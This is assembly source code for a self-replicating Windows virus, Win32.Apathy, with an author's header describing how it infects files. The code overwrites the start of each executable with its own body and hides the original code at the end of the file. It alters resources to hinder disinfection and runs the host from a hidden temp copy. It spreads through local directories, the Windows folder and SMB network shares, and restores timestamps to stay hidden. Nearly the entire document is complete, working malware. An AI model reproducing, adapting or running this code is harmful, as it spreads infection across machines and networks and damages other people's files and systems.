;
;                            - Win32.Apathy -
;                               -b0z0/iKX-
;
;  This is a PE infector that works in 9x/NT systems and infected files in
; that enviroments will work correctly after infection (I'm not sure that
; there is a secret bu... feature that could make them not to work).
; While infecting Win32.Apathy will overwrite the original PE start with
; a copy of itself, thus avoiding entirely the API searching problem,
; saving the original piece of code at the end of the infected file. To
; maintain compatibility with NT and to make disinfection a little tricky
; the virus will also change the .rsrc RVA and consequently all the resource
; entryes to some standard position. So just copying the original piece of
; will result in damaging the executable. The original file will be
; reconstructed in a temporary file and executed there as a new process.
; Check code for other things about the infection process and such.
; Win32.Apathy will also try to spread through the network (microsoft
; network or SMB or how you wanna call it) by scanning some connected
; resources and trying to infect files over there.
;
; The virus has been quite tested under Win95/98/NT4
;
; Win32.Apathy born really a lot of time ago, I started coding this just
; after Xine#3 was out, but then the whole project (like all my other VX
; projects) was stopped until about december 1998 when I decided to finish
; at least something. The code tho is not optimized at all, could not be
; too clear in some parts, I just wanted to materialize a few ideas I had
; and I didn't really care too much to optimize or something this.
;
; The virus name is quite obvious, but:
;     apathy: the state of having no wish to act and no enthusiasm
;
; Thanx to StarZero for cool hints and notes!
;
; For any kind of info or something contact me at cl0wn@geocities.com
;

.386
.model	flat

; kernel32 ones we need
extrn           SetFileAttributesA:PROC
extrn           Sleep:PROC
extrn           GetWindowsDirectoryA:PROC
extrn           GetTickCount:PROC
extrn           lstrcpy:PROC
extrn		ExitProcess:PROC
extrn           SetFileTime:PROC
extrn           DeleteFileA:PROC
extrn		GetTempPathA:PROC
extrn		GetTempFileNameA:PROC
extrn           CreateProcessA:PROC
extrn		CopyFileA:PROC
extrn		FindFirstFileA:PROC
extrn		FindNextFileA:PROC
extrn		GetCommandLineA:PROC
extrn		CloseHandle:PROC
extrn           ReadFile:PROC
extrn           HeapAlloc:PROC
extrn           GetProcessHeap:PROC
extrn		CreateFileA:PROC
extrn		CreateFileMappingA:PROC
extrn		MapViewOfFile:PROC
extrn		UnmapViewOfFile:PROC
extrn		GetFileSize:PROC
extrn           CreateMutexA:PROC
extrn           GetLastError:PROC

; for network from mpr.dll
extrn           WNetOpenEnumA:PROC
extrn           WNetEnumResourceA:PROC

.data

vname           db      0,'Win32.Apathy by '
author          db      '-b0z0/iKX-',0          ; used as mutex object name

fsearch:
f_attrib        dd      00h
f_ctime 	dd	00h,00h
f_atime 	dd	00h,00h
f_wtime 	dd	00h,00h
f_size_hi	dd	00h
f_size_lo	dd	00h
f_reserved	dd	00h,00h
f_name          db      104h    dup (?)
f_alt_name      db      0eh     dup (?)

msg             db      'i am nobody except genetic runaround',0

ff_handle	dd	00h
f_handle	dd	00h

dotdot_mask     db      '..',0
exemask         db      '*.EXE',0

v_map_handle	dd	00h
v_file_handle	dd	00h

orig_virus_p	dd	00h

pref            db      'ikx',0        ; tmp file name prefix

path_position   dd      offset new_path

new_path        db      112h dup (?)    ; max_path + a bit more
tmp_name        db      112h dup (?)

process_info    dd      4 dup (?)

; STARTUPINFO structure for new process
startup_info    dd      10h             ; lenght of this structure
                dd      00h,00h
title_startup   dd      00h             ; pointer to title for console progs
;

has_infected    db      00h             ; 00h no, 01h yes

virus_phase     db      07h             ; 07h infecting .
                                        ; 06h infecting windows directory
                                        ; 05h infecting network 1 try
                                        ; 04h infecting network 2 try
                                        ; 03h infecting ..
                                        ; 02h infecting network 3 try
                                        ; 01h infecting network 4 try

netspace        equ     4000h           ; 16kb as suggested. place for 200h
                                        ; entryes... way too much anyway

enum_handle     dd      00h             ; handle of Net enumeration
enum_count      dd      1ffh            ; how many got / how many to get
enum_size       dd      netspace        ; size of memory avaiable for results

r_point         dd      0h

; here begins the virus code
.code

; equs
exesize         equ     1502h           ; size of virus executable
pe_begin        equ      100h           ; where PE header begins in virus
file_align      equ      200h           ; file align value (= to linker one)
read_exe        equ     4096d           ; how much victim to read to check
marker          equ     '0z0b'          ; infection marker
wait_time       equ     2604d           ; time between each search
sleep_time      equ     7919d           ; add sleep time after good infection
f_shit          equ     2000h           ; first gen dim
; the marker must be set at offset 58h of the PE once compiled

startcode:
        call    GetProcessHeap

        push    (exesize + read_exe + netspace)
        push    8h                      ; zero memory
        push    eax
        call    HeapAlloc               ; allocate some memory from our heap

        mov     dword ptr [orig_virus_p],eax

	push	offset new_path
        push    112h
	call	GetTempPathA

	push	offset tmp_name 	; create a temporary name
        push    large 0
	push	offset pref
	push	offset new_path
	call	GetTempFileNameA

	call	GetCommandLineA 	; get our name

        cmp     byte ptr [eax],22h      ; " this is strange, sometimes cmdline
        jne     not_thatshit            ; is enclosed in "", so we must take
        inc     eax                     ; care if they are there
        push    eax
find_ending:
        cmp     byte ptr [eax],22h
        je      delete_ending_aswell
        inc     eax
        jmp     find_ending
delete_ending_aswell:
        mov     byte ptr [eax],20h
        pop     eax
not_thatshit:
        push    eax
        mov     dword ptr [title_startup],eax
search_end:
        inc     eax
        cmp     byte ptr [eax-1],'.'            ; go to the extension
        jne     search_end
        cmp     byte ptr [eax+3],20h            ; space
        je      found_end
        cmp     byte ptr [eax+3],00h            ; end of string
        jne     search_end
found_end:
        add     eax,3                   ; point on end of exe name
        push    eax

        push    eax                     ; copy possible command line options
        push    offset new_path         ; to the buffer
        call    lstrcpy

        pop     eax
        mov     byte ptr [eax],0        ; put null to open/copy it

        pop     eax

	push	large 0
	push	offset tmp_name
        push    eax                     ; copy ourselves to another name
	call	CopyFileA
        or      eax,eax
        jz      exit_critical_temp

        push    02h                     ; file attribute hidden
        push    offset tmp_name
        call    SetFileAttributesA

	xor	eax,eax
        push    eax
	push	large 80h
	push	large 3
        push    eax
        push    eax
        push    0c0000000h              ; readwrite
	push	offset tmp_name 	; open the temporary file
	call	CreateFileA

        inc     eax                     ; check if opened ok
        jz      exit_critical_temp
        dec     eax

	mov	dword ptr [v_file_handle],eax

        push    eax

        push    large 0
        push    eax                     ; handle
        call    GetFileSize             ; get size of file we are running from
        xchg    ecx,eax                 ; copied in a tmp file

        pop     eax

        push    ecx                     ; size

        xor     ecx,ecx
        push    ecx
        push    ecx                     ; entire file
        push    ecx
	push	large 04h
        push    ecx
	push	eax
	call	CreateFileMappingA
        cdq
        or      eax,eax
        jz      exit_critical_temp              ; eax map handle

        push    eax                     ; mapping handle

	push	edx
	push	edx
	push	edx
	push	large 02h
        push    eax
	call	MapViewOfFile

        or      eax,eax
        pop     ebx                     ; mapping handle
        je      exit_critical_temp

        cld

	mov	esi,eax
	mov	edi,dword ptr [orig_virus_p]
        mov     ecx,exesize
        mov     edx,ecx
        rep     movsb

        pop     ecx                     ; size

        cmp     ecx,f_shit
        jz      first_generation

        sub     ecx,edx
        sub     ecx,edx
        push    ebx                     ; map handle
        mov     edi,esi
        add     esi,ecx
        mov     ecx,edx
        sub     edi,ecx
        push    edi                     ; to beginning of file mapping in mem
        push    edi
        rep     movsb                   ; restore original
        pop     edi

        mov     esi,edi                 ; now we must restore the resources

        add     edi,dword ptr [edi+3ch]         ; on PE
        mov     eax,dword ptr [edi+8ch]         ; resources lenght

        or      eax,eax
        jz      no_resourz

        mov     eax,dword ptr [edi+88h]         ; resources RVA
        add     edi,0f8h+0ch                    ; to objects
srs_loo:
        cmp     eax,dword ptr [edi]             ; is the resources one?
        je      got_srsr
        add     edi,28h                         ; lenght of an object
        jmp     srs_loo
got_srsr:
        add     esi,dword ptr [edi+08h]         ; physical offset of resources
        mov     ebx,4000h                       ; fixed virus resources RVA
        sub     ebx,eax
        call    rsrs_change                     ; call changer

no_resourz:                                     ; everything is ready again
        call    UnmapViewOfFile

        call    CloseHandle

        push    dword ptr [v_file_handle]       ; close virus file
        call    CloseHandle

        xor     eax,eax

        push    offset process_info
        push    offset startup_info
        push    eax
        push    eax
        push    eax
        push    eax
        push    eax
        push    eax
        push    offset new_path         ; to command line options
        push    offset tmp_name         ; to file to execute
        call    CreateProcessA          ; run host executable

first_generation:
        push    offset author           ; name of the mutex object
        push    large 1
        push    large 0
        call    CreateMutexA            ; create one

        call    GetLastError            ; check if one with the same name
        or      eax,eax                 ; already exist. if so virus is already
        jnz     exit_critical_temp      ; running as another process

        mov     eax,offset exemask

search_loop:
	push	offset fsearch
        push    eax
        call    FindFirstFileA          ; search for some victims
	cmp	eax,-1
	je	end_file_search

        mov     dword ptr [ff_handle],eax

infect_file:
        push    offset f_name
        push    dword ptr [path_position]               ; copy found file
        call    lstrcpy                                 ; after directory

        push    80h                             ; FILE_ATTRIBUTE_NORMAL
        push    offset new_path
        call    SetFileAttributesA              ; delete attributes

        or      eax,eax
        jz      error_attributes

	xor	eax,eax

        push    eax
	push	large 80h
	push	large 3
        push    eax
        push    eax
        push    0c0000000h                      ; readwrite
        push    offset new_path                 ; full file name to file to
        call    CreateFileA                     ; infect

        inc     eax
        jz      error_opening
        dec     eax

	mov	dword ptr [f_handle],eax

        push    eax

        mov     edx,dword ptr [orig_virus_p]    ; virus heap
        add     edx,exesize                     ; read data is after original
        push    edx

        push    large 0
        push    offset f_size_hi                ; some place to store nr of
        push    read_exe                        ; readed bytes
        push    edx
        push    eax
        call    ReadFile                        ; read header

        pop     edx
        pop     eax

        cmp     word ptr [edx],'ZM'             ; exe?
        jne     not_to_infect

        mov     ecx,dword ptr [edx+3ch]         ; pointer to PE header

        cmp     ecx,(read_exe - 4)              ; is the PE header in readed
        jae     not_to_infect                   ; chunk of executable?

        add     edx,ecx

        cmp     dword ptr [edx],'EP'
        jne     not_to_infect

        cmp     dword ptr [edx+58h],marker      ; already infected?
        je      not_to_infect

        test    dword ptr [edx+3ch],(file_align - 1)
        jnz     not_to_infect                   ; must have an align cmptible

        mov     ecx,dword ptr [f_size_lo]       ; file size (assume <= 4gb)

        cmp     ecx,(10 * 1024)         ; not too small files
        jbe     not_to_infect           ; leave it

        mov     ebx,dword ptr [edx+8ch] ; resource size
        or      ebx,ebx
        jz      no_resp

        mov     ebx,dword ptr [edx+88h]         ; pointer to resources

        add     edx,(0f8h + 0ch)
search_rsrcs:
        cmp     ebx,dword ptr [edx]             ; is the resources one?
        je      got_rsrcs
        add     edx,28h                         ; lenght of an object
        jmp     search_rsrcs
got_rsrcs:
        sub     edx,0ch                         ; on beginning of this object

        cmp     dword ptr [edx+14h],exesize     ; are resources after the virus
        jbe     not_to_infect                   ; size (this is won't be overw)

        mov     ebx,edx
no_resp:
        mov     dword ptr [r_point],ebx

        add     ecx,exesize             ; will extend it by exesize

        xor     edx,edx

        push    edx
        push    ecx
        push    edx
	push	large 04h
        push    edx
	push	eax
	call	CreateFileMappingA
	cdq
        or      eax,eax
        jz      not_to_infect

        mov     dword ptr [v_map_handle],eax

	push	edx
	push	edx
	push	edx
	push	large 02h
        push    eax
	call	MapViewOfFile
        or      eax,eax
        jz      close_map_exit

	mov	edi,eax

	push	edi
	mov	esi,edi
        add     edi,dword ptr [f_size_lo]
	mov	edx,edi
        mov     ecx,exesize             ; save original code after the end
	push	ecx
	rep	movsb
	pop	ecx
	pop	edi

	push	edi
        mov     esi,dword ptr [orig_virus_p]    ; on vir
        rep     movsb                           ; copy virus body
        pop     edi

        push    edi

	mov	esi,edx
        mov     edx,edi

	add	esi,dword ptr [esi+3ch]  ; on PE

        mov     ecx,4000h               ; image size of virus file w/o rsrcs
        mov     dword ptr [edi+pe_begin+50h],ecx    ; correct image size

        mov     word ptr [edi+pe_begin+6],3h    ; number of virus objects

        mov     eax,dword ptr [r_point]         ; pointer to resources object

        mov     ebx,dword ptr [esi+8ch]         ; resource size
        mov     dword ptr [edi+pe_begin+8ch],ebx
        mov     dword ptr [edi+pe_begin+88h],0h ; zero resurce RVA by default

        or      eax,eax                  ; resources length 0?
	jz	no_resources

        mov     ebx,dword ptr [esi+88h] ; resource RVA
        sub     ebx,ecx

        mov     dword ptr [edi+pe_begin+88h],ecx  ; set resources pointer

        inc     word ptr [edi+pe_begin+6]       ; number of objects

        mov     esi,eax                         ; on resources object

        add     edi,(pe_begin + 0f8h + (3*28h))
        mov     ecx,028h                        ; copy resources object
	rep	movsb

        mov     esi,edx                 ; on beginning of file

        mov     dword ptr [edi-28h+0ch],4000h
        mov     eax,dword ptr [edi-28h+08h]     ; object virtual size
        add     eax,(1000h - 1)
        and     eax,0fffff000h
        add     dword ptr [edi - (0f8h + (4*28h)) + 50h],eax    ; to image size

        mov     eax,dword ptr [edi-28h+14h]     ; physical offset of resources
        add     esi,eax
        call    rsrs_change                     ; change those

no_resources:
        call    UnmapViewOfFile                 ; unmap view of file

        inc     byte ptr [has_infected]         ; good infection, so a pause
                                                ; will occour
close_map_exit:
        push    dword ptr [v_map_handle]
        call    CloseHandle                     ; close mapping handle

        mov     eax,dword ptr [f_handle]
        push    eax

        push    offset f_wtime
        push    offset f_atime
        push    offset f_ctime
        push    eax
        call    SetFileTime             ; restore original file time

        pop     eax

not_to_infect:
        push    eax                     ; file handle
        call    CloseHandle             ; close infected file

error_opening:
        push    dword ptr [f_attrib]    ; restore old attributes to file
        push    offset new_path
        call    SetFileAttributesA

error_attributes:
        mov     eax,wait_time           ; so it won't work too much

        dec     byte ptr [has_infected]
        jnz     no_infection

        add     eax,sleep_time          ; if a file was infected then make a
                                        ; longer pause
no_infection:
        push    eax
        call    Sleep                   ; pause until next one

        mov     byte ptr [has_infected],00h     ; reset infection mark

        push    offset fsearch
        push    dword ptr [ff_handle]
        call    FindNextFileA
        or      eax,eax                         ; no more files?
        jz      end_file_search
        jmp     infect_file                     ; else infect

end_file_search:

        call    GetTickCount                    ; should we go deeper in dir
        shr     eax,1                           ; from actual position?
        jc      next_phase

        mov     esi,dword ptr [path_position]   ; search from last dir fwd
        mov     dword ptr [esi],' .*'           ; to search dirs and such

        push    eax

        push    offset fsearch
        push    offset new_path
        call    FindFirstFileA
        mov     dword ptr [ff_handle],eax
        cmp     eax,-1
        pop     eax
        je      next_phase                      ; no dirs in here

check_dir:
        test    dword ptr [f_attrib],10h        ; is a directory?
        jz      search_next_dir

        cmp     byte ptr [f_name],'.'           ; not . or ..
        je      search_next_dir

        shr     eax,1                           ; select randomly if walk into
        jnc     search_next_dir                 ; this or try another

        mov     eax,dword ptr [path_position]   ; put after actual search path
        mov     esi,offset f_name               ; point to directory name

        jmp     copy_from_eax
search_next_dir:
        push    eax
        push    offset fsearch
        push    dword ptr [ff_handle]           ; search next
        call    FindNextFileA
        or      eax,eax                         ; no more directoryes?
        pop     eax
        jnz     check_dir

next_phase:
        dec     byte ptr [virus_phase]
        mov     al,byte ptr [virus_phase]

        or      al,al                   ; phases finished
        jz      farewell_and_goodnight

        cmp     al,03h                  ; search in ..
        je      search_dotdot

        cmp     al,06h                  ; windows directory phase
        jne     network_work

        mov     esi,offset new_path

        push    104h                    ; buffer lenght
        push    esi                     ; search in windoze directory
        call    GetWindowsDirectoryA
        jmp     copy_and_gosearch

search_dotdot:
        mov     esi,offset dotdot_mask
        jmp     copy_and_gosearch

network_work:
        xor     ebx,ebx
find_resource:
        push    offset enum_handle
        push    ebx             ; pointer to NETSOURCE structure to use
        push    large 3                         ; CONNECTABLE | CONTAINER
        push    large 1                         ; RESOURCETYPE_DISK
        push    large 2                         ; RESOURCE_GLOBALNET
        call    WNetOpenEnumA
        or      eax,eax                         ; 0 = NO_ERROR
        jnz     next_phase                      ; on error just skip this phase

        mov     eax,dword ptr [orig_virus_p]    ; pointer to heap
        add     eax,(exesize + read_exe)        ; after other data

        mov     dword ptr [enum_count],1ffh     ; get max entryes

        push    eax

        push    offset enum_size                ; avaiable memory for results
        push    eax                             ; where to place results
        push    offset enum_count               ; how many to enumerate
        push    dword ptr [enum_handle]         ; handle of enumeration
        call    WNetEnumResourceA
        pop     ebx
        or      eax,eax                         ; 0 = NO_ERROR
        jnz     next_phase                      ; if some error skip

        mov     ecx,dword ptr [enum_count]      ; number of entryes got

        call    GetTickCount                    ; random
        xor     edx,edx
        div     ecx

        mov     eax,20h                         ; lenght of one entry
        mul     edx                             ; select which one
        add     ebx,eax

        test    dword ptr [ebx+0ch],01h         ; is an usable resource
        jz      find_resource
                                                ; if not should be a container
                                                ; (local or remote) so continue
                                                ; to next level

got_resource:
        mov     esi,dword ptr [ebx+14h]         ; here it is

copy_and_gosearch:
        mov     eax,offset new_path
copy_from_eax:

        push    eax

        push    esi                             ; path to network or dir
        push    eax                             ; where to copy
        call    lstrcpy

        pop     eax
loop_searchzero:
        cmp     byte ptr [eax],00h
        je      got_null_termination            ; find end
        inc     eax
        jmp     loop_searchzero
got_null_termination:
        mov     byte ptr [eax],'\'              ; add \
        inc     eax

        mov     dword ptr [path_position],eax

        push    offset exemask                  ; and now copy the *.exe mask
        push    eax
        call    lstrcpy

        mov     eax,offset new_path
        jmp     search_loop

farewell_and_goodnight:

exit_critical_temp:

; before exiting delete some temp files (the still used ones will be deleted
; next time since are actually in use)

        mov     esi,offset tmp_name             ; has temp path + last temp name
search_dottmp:
        inc     esi
        cmp     word ptr [esi],'i\'             ; find beginning of name
        jne     search_dottmp
        inc     esi
        inc     esi
        cmp     word ptr [esi],'xk'
        jne     search_dottmp
got_end:
        inc     esi
        inc     esi
        push    esi
        mov     dword ptr [esi],'mt.*'          ; set delete ikx*.tmp
        mov     word ptr [esi+4],'p'            ; p + null termination

        push    offset fsearch
        push    offset tmp_name
        call    FindFirstFileA

        pop     edi                             ; after ikx in temp name
        cmp     eax,-1
        je      exit_deletion
delete_temps:
        mov     esi,(offset f_name + 3)
        mov     ecx,9h          ; sometimes will be shorter but wc
        push    edi
        rep     movsb
        pop     edi

        push    eax                             ; preserve handle
        push    offset tmp_name
        call    DeleteFileA                     ; could fail if file is
        pop     eax                             ; used, but np

        push    eax
        push    offset fsearch
        push    eax
        call    FindNextFileA                   ; find next to delete
        or      eax,eax
        pop     eax
        jnz     delete_temps

exit_deletion:

exit:
        push    LARGE -1                        ; that's all, will release also
        call    ExitProcess                     ; our mutex object

rsrs_change:
; EBX = value to substract to each resource element
; ESI = pointer to resources
        xor     edx,edx                 ; will keep number of data elements
        push    ebx
search_rsr:
        add     esi,10h
        movzx   ecx,word ptr [esi - 2]          ; nr of named and integer
        add     cx,word ptr [esi - 4]           ; entryes in this dir
        adc     ecx,0
na_nasl:
        mov     ebx,dword ptr [esi + 4]
        test    ebx,80000000h                   ; is a resource data entry?
        jnz     is_subdir
        inc     edx
is_subdir:
        add     esi,8                           ; on next
        loop    na_nasl
        cmp     dword ptr [esi],00h             ; finished ?
        je      search_rsr

        pop     ebx
        mov     ecx,edx
change_res:
        sub     dword ptr [esi],ebx             ; sub requested value
        add     esi,10h
        loop    change_res                      ; change all entryes
        ret

	end	startcode








